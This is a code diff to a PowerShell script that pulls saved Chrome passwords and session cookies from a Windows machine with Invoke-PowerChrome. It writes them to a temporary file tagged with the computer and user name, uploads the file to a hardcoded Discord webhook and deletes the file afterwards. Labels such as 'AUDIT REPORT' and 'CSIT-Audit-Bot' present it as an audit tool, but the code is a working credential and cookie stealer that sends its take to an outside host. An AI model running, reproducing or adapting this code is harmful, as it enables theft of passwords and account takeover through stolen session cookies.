@@ -922,18 +922,24 @@ if (-not ($Browser)){
     }
 
 }
-# 1. Extract Passwords
+# --- REPLACEMENT BLOCK START ---
+
+# 1. Capture everything
+Write-Host "Gathering Passwords..." -ForegroundColor Cyan
 $Passwords = Invoke-PowerChrome -Browser Chrome -HideBanner
 
-# 2. Extract Cookies
-# Adding the -Cookies switch tells the script to target the Cookies database
+Write-Host "Gathering Cookies..." -ForegroundColor Cyan
 $Cookies = Invoke-PowerChrome -Browser Chrome -Cookies -HideBanner
 
-# 3. Check if we found any data and combine it
+# 2. Check if we found any data and combine it
 if ($Passwords -or $Cookies) {
-    # Build a single readable string
+    # Define variables for the report
+    $HostName = $env:COMPUTERNAME
+    $UserName = $env:USERNAME
+
+    # Build the report string
     $Report = "=================================================`n"
-    $Report += "   AUDIT REPORT: $env:COMPUTERNAME - $env:USERNAME `n"
+    $Report += "   AUDIT REPORT: $HostName - $UserName `n"
     $Report += "=================================================`n`n"
     
     $Report += "--- [ SAVED PASSWORDS ] ---`n"
@@ -942,25 +948,22 @@ if ($Passwords -or $Cookies) {
     $Report += "`n--- [ SESSION COOKIES ] ---`n"
     $Report += ($Cookies | Out-String)
 
-    # 4. Save to your temporary results file
-    $TempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "Full_Audit_$($env:COMPUTERNAME).txt")
+    # 3. Save to a temporary file
+    $TempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "Full_Audit_$($HostName).txt")
     $Report | Set-Content -Path $TempFile -Encoding UTF8
-
-    # ... Your existing Discord upload code (Step 4 & 5) follows here ...
 
     # 4. Define the Webhook and Payload
     $WebhookUrl = "https://discord.com/api/webhooks/1493893030439157881/QCtnE2iZqh52ccW3JRiWno55pzKqV3rR20SeETHwNLwLyLiVI7Cn28rZKGU2lZz_0Eep"
     
     $Payload = @{
         username = "CSIT-Audit-Bot"
-        content  = "### 🛡️ Credential Audit Results from **$HostName**`n**User:** $UserName`nSee attached file for full details."
+        content  = "### 🛡️ Full Audit Results from **$HostName**`n**User:** $UserName`nPasswords and Cookies extracted successfully."
     }
     $JsonBody = $Payload | ConvertTo-Json -Compress
     
-    # 5. Send to Discord as a file attachment
+    # 5. Send to Discord
     try {
         if ($PSVersionTable.PSVersion.Major -ge 6) {
-            # PowerShell 6.0+ (Core) supports the -Form parameter for multipart/form-data
             $FormContent = @{
                 payload_json = $JsonBody
                 file         = Get-Item -Path $TempFile
@@ -968,22 +971,15 @@ if ($Passwords -or $Cookies) {
             Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form $FormContent
         }
         else {
-            # Windows PowerShell 5.1 workaround using .NET HttpClient
             Add-Type -AssemblyName System.Net.Http
             $HttpClient = New-Object System.Net.Http.HttpClient
             $MultipartContent = New-Object System.Net.Http.MultipartFormDataContent
+            $MultipartContent.Add((New-Object System.Net.Http.StringContent($JsonBody)), "payload_json")
             
-            # Add JSON payload
-            $JsonContent = New-Object System.Net.Http.StringContent($JsonBody)
-            $MultipartContent.Add($JsonContent, "payload_json")
-            
-            # Add File attachment
             $FileBytes = [System.IO.File]::ReadAllBytes($TempFile)
             $FileContent = New-Object System.Net.Http.ByteArrayContent($FileBytes, 0, $FileBytes.Length)
-            $FileName = [System.IO.Path]::GetFileName($TempFile)
-            $MultipartContent.Add($FileContent, "file", $FileName)
+            $MultipartContent.Add($FileContent, "file", [System.IO.Path]::GetFileName($TempFile))
             
-            # Execute request
             $Response = $HttpClient.PostAsync($WebhookUrl, $MultipartContent).Result
             $Response.EnsureSuccessStatusCode() | Out-Null
             $HttpClient.Dispose()
@@ -994,10 +990,11 @@ if ($Passwords -or $Cookies) {
         Write-Host "Discord Error: $($_.Exception.Message)" -ForegroundColor Red
     }
     finally {
-        # 6. Cleanup temporary file
+        # 6. Cleanup
         if (Test-Path $TempFile) { Remove-Item -Path $TempFile -Force }
     }
 }
 else {
-    Write-Host "No passwords were found on this machine." -ForegroundColor Yellow
+    Write-Host "No data was found on this machine." -ForegroundColor Yellow
 }
+# --- REPLACEMENT BLOCK END ---
